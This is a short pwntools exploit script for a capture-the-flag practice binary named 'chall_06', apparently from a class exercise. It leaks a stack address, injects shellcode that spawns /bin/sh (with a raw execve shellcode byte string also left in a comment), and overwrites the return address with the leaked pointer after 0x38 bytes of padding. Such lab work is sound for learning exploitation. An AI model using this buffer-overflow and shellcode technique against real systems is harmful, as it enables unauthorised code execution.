
# Similar to third speedrun
# Inclass help, review inclass

p = process('./chall_06')
binary = ELF('./chall_06')


# p64(int(str(p.recv()).split(":")
# Letting my armor fall again / Get address
leak = p.recvline().decode('ascii').split()
rsp = int(leak[-1], 0)

#p.sendline(b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05")

# p_code = asm(shellcraft.sh()).rjust(64, asm('nop'))
context.arch = 'amd64'
shell = asm(shellcraft.sh())
p.sendline(shell)

# (vuln+56) (0x40 - 0x8) = 0x38 
len = int(0x38)
print(len)

# b'' + p64($leakedAddress) +  (0x38 * b"A") 
payload = p64(rsp) + b'A'*(0x38)

print('[*] Launch /bin/sh')
p.sendline(payload)
p.interactive()

